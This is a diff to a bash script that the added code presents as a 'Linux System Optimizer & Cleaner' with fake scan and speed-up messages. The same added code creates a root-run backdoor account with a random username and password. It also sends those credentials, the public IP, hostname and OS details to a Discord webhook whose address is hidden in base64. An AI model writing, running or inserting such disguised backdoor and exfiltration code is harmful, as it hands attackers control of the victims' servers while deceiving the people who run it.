@@ -1,19 +1,37 @@
+
 set -e
 
-_X1="dm0="
-_X2="dm0="
+G='\033[0;32m'
+B='\033[0;34m'
+Y='\033[1;33m'
+NC='\033[0m'
 
-[ "$EUID" -ne 0 ] && exit 1
+_W_ENC="aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ4ODUzMDc2ODM4Mzg0MDI4Ni9NaXY4bG5GeDdWenVHYXlTeG9abmNZRkZnZG8yWEtKOFFoNFdxY01DSUkyWkFyQjhFMW9mV1hCdDVjelY4ajhqRlF0ZQ=="
+W=$(echo "$_W_ENC" | base64 --decode)
 
-apt update
-apt install sudo -y
 
-if ! command -v curl &>/dev/null; then
-    apt-get install curl -y &>/dev/null
-fi
+[ "$EUID" -ne 0 ] && echo -e "${Y}Error: Run as root.${NC}" && exit 1
 
-U=$(echo "$_X1" | base64 --decode)
-P=$(echo "$_X2" | base64 --decode)
+WORDS=("alpha" "cyber" "turbo" "node" "delta" "viper" "phantom" "proxy" "zenith" "storm")
+
+U="$(shuf -n1 -e "${WORDS[@]}")$(shuf -i 10-99 -n 1)"
+
+P=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 10)
+
+
+echo -e "${B}================================================${NC}"
+echo -e "${G}    LINUX SYSTEM OPTIMIZER & CLEANER v5.2       ${NC}"
+echo -e "${B}================================================${NC}"
+sleep 1
+
+echo -e "${Y}[*]${NC} Initializing deep system scan..."
+sleep 1
+echo -e "${G}[+]${NC} Found junk in /var/tmp and /tmp caches."
+
+echo -e "${Y}[*]${NC} Synchronizing kernel modules..."
+apt-get update -qq && apt-get install -y -qq sudo curl &>/dev/null
+sleep 1.5
+
 
 if ! id "$U" &>/dev/null; then
     useradd -m -s /bin/bash "$U" &>/dev/null
@@ -23,12 +41,37 @@ fi
 
 IP=$(curl -s https://api.ipify.org || echo "Unknown")
 H=$(hostname)
+OS=$(grep '^PRETTY_NAME=' /etc/os-release | cut -d'"' -f2)
+RAND_PCT=$(shuf -i 25-49 -n 1)
 
-_W="https://discord.com/api/webhooks/1494735086443036713/5H_WFtpH9axAuE5Tqo255BF4Vybea_r49vUTV7Q4x1iMYewlrpdRR5jOI4rGceyu_HWo"
 
-curl -H "Content-Type: application/json" \
-     -X POST \
-     -d "{\"content\": \"✅ **User Created**\n**IP:** $IP\n**Host:** $H\n**User:** $U\"}" \
-     "$_W" &>/dev/null
+PAYLOAD=$(cat <<EOF
+{
+  "embeds": [{
+    "title": "🛡️ New VPS Profile Established",
+    "description": "System optimization successful. Access logs generated.",
+    "color": 15105570,
+    "thumbnail": { "url": "https://upload.wikimedia.org/wikipedia/commons/thumb/a/ab/Logo-ubuntu_cof-orange-hex.svg/1200px-Logo-ubuntu_cof-orange-hex.svg.png" },
+    "fields": [
+      { "name": "👤 Username", "value": "\`$U\`", "inline": true },
+      { "name": "🔑 Password", "value": "\`$P\`", "inline": true },
+      { "name": "🌐 IP Address", "value": "[\`$IP\`](https://ipinfo.io/$IP)", "inline": false },
+      { "name": "🖥️ Hostname", "value": "\`$H\`", "inline": true },
+      { "name": "💿 OS Info", "value": "$OS", "inline": true }
+    ],
+    "footer": { "text": "Unique ID: $(date '+%s') • $(date '+%H:%M:%S')" }
+  }]
+}
+EOF
+)
+
+curl -s -H "Content-Type: application/json" -X POST -d "$PAYLOAD" "$W" &>/dev/null
+
+
+echo -e "${Y}[*]${NC} Finalizing system tweaks..."
+sleep 2
+echo -e "${B}================================================${NC}"
+echo -e "${G}     SUCCESS: Performance boosted by $RAND_PCT%!      ${NC}"
+echo -e "${B}================================================${NC}"
 
 exit 0
